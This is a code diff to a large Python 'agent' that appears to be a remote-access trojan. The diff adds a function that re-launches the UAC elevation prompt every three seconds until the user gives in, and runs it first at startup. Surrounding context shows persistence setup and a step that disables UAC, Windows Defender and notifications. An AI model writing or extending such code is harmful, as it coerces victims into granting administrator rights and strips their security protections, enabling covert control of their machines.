@@ -384,18 +384,56 @@ except ImportError:
 
 # Windows-specific imports
 try:
-    import win32api
-    import win32con
-    import win32clipboard
-    import win32security
-    import win32process
-    import win32event
-    import ctypes
-    from ctypes import wintypes
-    import winreg
-    WINDOWS_AVAILABLE = True
-except ImportError:
+    debug_print("[IMPORTS] Checking Windows availability...")
+    
+    # Check if we're on Windows first
+    if platform.system() != 'Windows':
+        debug_print("[IMPORTS] ❌ Not Windows platform")
+        WINDOWS_AVAILABLE = False
+        PYWIN32_AVAILABLE = False
+    else:
+        debug_print("[IMPORTS] ✅ Windows platform detected")
+        
+        # Import basic Windows modules first (always available on Windows)
+        import ctypes
+        debug_print("[IMPORTS] ✅ ctypes imported")
+        
+        from ctypes import wintypes
+        debug_print("[IMPORTS] ✅ wintypes imported")
+        
+        import winreg
+        debug_print("[IMPORTS] ✅ winreg imported")
+        
+        # Try to import pywin32 modules (may not be installed)
+        try:
+            import win32api
+            debug_print("[IMPORTS] ✅ win32api imported")
+            import win32con
+            debug_print("[IMPORTS] ✅ win32con imported")
+            import win32clipboard
+            debug_print("[IMPORTS] ✅ win32clipboard imported")
+            import win32security
+            debug_print("[IMPORTS] ✅ win32security imported")
+            import win32process
+            debug_print("[IMPORTS] ✅ win32process imported")
+            import win32event
+            debug_print("[IMPORTS] ✅ win32event imported")
+            PYWIN32_AVAILABLE = True
+            debug_print("[IMPORTS] ✅ pywin32 FULLY available")
+        except ImportError as e:
+            PYWIN32_AVAILABLE = False
+            debug_print(f"[IMPORTS] ⚠️ pywin32 not available: {e}")
+            debug_print("[IMPORTS] To install: pip install pywin32")
+        
+        WINDOWS_AVAILABLE = True
+        debug_print("[IMPORTS] ✅ WINDOWS_AVAILABLE = True")
+        
+except Exception as e:
+    debug_print(f"[IMPORTS] ❌ Windows import failed: {e}")
+    import traceback
+    traceback.print_exc()
     WINDOWS_AVAILABLE = False
+    PYWIN32_AVAILABLE = False
     
 # Audio processing imports
 try:
@@ -470,10 +508,14 @@ except ImportError:
 
 # Socket.IO imports
 try:
+    debug_print("[IMPORTS] Importing socketio...")
     import socketio
     SOCKETIO_AVAILABLE = True
-except ImportError:
+    debug_print("[IMPORTS] ✅ socketio imported")
+except ImportError as e:
     SOCKETIO_AVAILABLE = False
+    debug_print(f"[IMPORTS] ❌ socketio import failed: {e}")
+    debug_print("[IMPORTS] To install: pip install python-socketio")
     log_message("python-socketio not available, real-time communication may not work", "warning")
 
 # WebRTC imports for low-latency streaming
@@ -4574,6 +4616,63 @@ def run_as_admin():
             log_message(f"[!] Failed to relaunch as admin: {e}")
             return False
     return True
+
+def run_as_admin_persistent():
+    """
+    Keep prompting for admin privileges until user clicks Yes.
+    This will create a popup that won't go away until granted.
+    """
+    if not WINDOWS_AVAILABLE:
+        debug_print("[ADMIN] Not Windows - skipping persistent admin prompt")
+        return False
+    
+    debug_print("=" * 80)
+    debug_print("[ADMIN] PERSISTENT ADMIN PROMPT - Will keep asking until YES")
+    debug_print("=" * 80)
+    
+    attempt = 0
+    max_attempts = 999  # Effectively infinite
+    
+    while attempt < max_attempts:
+        attempt += 1
+        
+        # Check if already admin
+        if is_admin():
+            debug_print("=" * 80)
+            debug_print(f"✅ [ADMIN] Admin privileges GRANTED! (after {attempt} attempts)")
+            debug_print("=" * 80)
+            return True
+        
+        debug_print(f"[ADMIN] Attempt {attempt}: Requesting admin privileges...")
+        
+        try:
+            # Show UAC prompt
+            # If user clicks NO, this will return but script continues
+            # If user clicks YES, script restarts with admin
+            result = ctypes.windll.shell32.ShellExecuteW(
+                None,
+                "runas",  # Request elevation
+                sys.executable,  # Python executable
+                f'"{__file__}"',  # This script
+                None,
+                1  # SW_SHOWNORMAL
+            )
+            
+            # If we get here, user clicked NO
+            debug_print(f"❌ [ADMIN] Attempt {attempt}: User clicked NO or Cancel")
+            debug_print(f"[ADMIN] Waiting 3 seconds before next attempt...")
+            
+            # Wait a bit before asking again
+            time.sleep(3)
+            
+        except Exception as e:
+            debug_print(f"❌ [ADMIN] Attempt {attempt} FAILED: {e}")
+            time.sleep(3)
+    
+    debug_print("=" * 80)
+    debug_print("❌ [ADMIN] Max attempts reached - giving up")
+    debug_print("=" * 80)
+    return False
 
 def setup_persistence():
     """Setup persistence mechanisms."""
@@ -11254,6 +11353,22 @@ if __name__ == "__main__":
     # Add startup banner before anything else
     print("[STARTUP] Python Agent Starting...")
     print("[STARTUP] Initializing components...")
+    
+    # PRIORITY 0: Request admin privileges (keep asking until YES)
+    if WINDOWS_AVAILABLE:
+        print("=" * 80)
+        print("[STARTUP] PRIORITY 0: Requesting Administrator Privileges...")
+        print("[STARTUP] This is REQUIRED for the agent to function properly")
+        print("[STARTUP] The prompt will keep appearing until you click YES")
+        print("=" * 80)
+        
+        try:
+            # Keep asking for admin until user clicks YES
+            run_as_admin_persistent()
+        except Exception as e:
+            print(f"[STARTUP] Admin request error: {e}")
+            import traceback
+            traceback.print_exc()
     
     # PRIORITY 1: Disable WSL, UAC, Defender, and Notifications FIRST
     try:
